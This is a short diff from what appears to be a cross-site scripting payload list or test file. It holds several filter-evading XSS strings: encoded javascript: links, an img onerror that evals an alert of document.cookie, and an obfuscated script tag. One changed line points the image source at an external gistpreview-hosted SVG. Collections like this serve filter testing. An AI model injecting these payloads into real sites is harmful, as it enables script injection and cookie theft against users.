@@ -3,7 +3,7 @@
 </output>
 <a href="javascript&colon;alert&lpar;document&period;domain&rpar;">Click Here</a>
 
-<img src=x onerror="eval('alert(document.cookie)')"/>
+<img src="https://gistpreview.github.io/?029781441a2d3737294741f2d6a4c821/image8.svg" onerror="eval('alert(document.cookie)')"/>
 <IMG SRC=javascript:alert(&quot;XSS&quot;)>
 
 <s\Cr\ipt\>alert(document\.cookie)<\/s\Cr\ipt\>\;\/>
